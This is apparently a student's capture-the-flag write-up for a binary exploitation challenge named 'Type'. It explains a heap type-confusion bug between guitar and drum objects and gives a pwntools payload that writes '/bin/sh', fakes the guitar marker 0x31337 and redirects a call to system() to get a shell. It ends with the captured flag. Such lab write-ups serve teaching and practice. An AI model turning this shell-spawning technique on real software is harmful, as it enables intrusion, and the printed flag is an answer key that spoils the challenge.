# Type:Solution

The binary is compiled with NX, a stack canary, and Full RELRO
```
checksec ./chal.bin
[*] '/root/workspace/vuln/type/chal/chal.bin'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

There is not win function in this binary, so we have to find a way to get a shell. The binary has a system call, so we can use that. The problem is that /bin/sh isn't in the binary so we'll have to write it to memory. We'll have to write it to the heap because there's a canary, and no way to leak the canary.

Using binja we can see that the space used for the guitar is 16, and the space used for the drum is 32. The difference in size combined with the fact that they are both using the same input for either option makes it possible to use type confusion to exploit the binary.
```
0x406290    0x0000000000000000    0x0000000000000031    ........1.......
0x4062a0    0x0000726174697567    0x0000000000000000    guitar..........
0x4062b0    0x0000000000031337    0x0000000000401600    7.........@.....
0x4062c0    0x0000000000000000    0x0000000000000041    ........A.......
0x4062d0    0x000000006d757264    0x0000000000000000    drum............
```

Using this we can borrow a drum and use it to store values and then mimic the guitar. The display_guitar function checks to see if it's a guitar using the value 31337. 
```
00401a91  if ((((sx.q(var_30) << 3) + &instruments) + 0x10) != 0x31337)
```

So in order to exploit this, we have to borrow a drum and then name it. In the name we have to first write /bin/sh because it ends in null and will stop anything after it from executing. We pad 8 to fill the memory space. Then we artificially make it a guitar with 0x31337. Then we add the call to system and send the chain. 
```
# read until end of menu
p.recvuntil(b'>>> ')

# select drums
p.sendline(b'2')

# read until end of menu
p.recvuntil(b'>>> ')

# name the drums
p.sendline(b'3')

# select instrument 0
p.sendline(b'0')

# write /bin/sh
chain = b'/bin/sh\0'

chain += b'A' * 8

# make it guitar
chain += p64(0x31337)

# call system
chain += p64(e.sym['system'])

p.sendline(chain)
```

After this we have to display the name of the instrument we borrowed which was number 0. This will then give us a shell and we can cat the flag!
```
flag{D4z3d_and_confus3D_4_s0_l0Ng}
```

Resources:
* Class Slides
* Louie
* Ash
